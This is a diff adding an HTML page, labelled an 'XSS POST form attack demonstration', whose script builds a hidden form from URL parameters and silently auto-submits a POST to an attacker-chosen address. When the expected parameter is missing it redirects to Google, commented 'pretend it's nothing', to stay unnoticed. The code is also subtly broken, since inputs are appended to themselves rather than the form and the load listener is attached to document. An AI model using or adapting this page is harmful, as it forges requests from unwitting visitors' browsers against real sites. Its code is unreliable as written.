@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS POST form attack demostration</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        .shadow {
+            visibility: hidden;
+        }
+    </style>
+    <script>
+        const KEY_ACTION = 'a';
+        const KEY_FIELD_PREFIX = 'f:';
+
+        function fail() {
+            // pretend it's nothing
+            location.assign('https://www.google.com/');
+        }
+
+        document.addEventListener('load', ()=>{
+            const p = new URLSearchParams(window.location.search);
+
+            if(!p.has(KEY_ACTION)) {
+                fail();
+                return;
+            }
+
+            const f = document.createElement('form');
+            f.action = p.get(KEY_ACTION);
+            f.method = 'POST';
+            f.classList.add('shadow');
+
+            p.forEach((v, k) =>{
+                if(!k.startsWith(KEY_FIELD_PREFIX)) {
+                    return;
+                }
+
+                k = k.substring(KEY_FIELD_PREFIX.length);
+                const i = document.createElement('input');
+                i.type = 'text';
+                i.name = k;
+                i.value = v;
+                i.appendChild(i);
+            });
+
+            document.body.appendChild(f);
+
+            // do your job
+            f.submit();
+        });
+    </script>
+</head>
+<body>
+<em>načítám…</em>
+</body>
+</html>
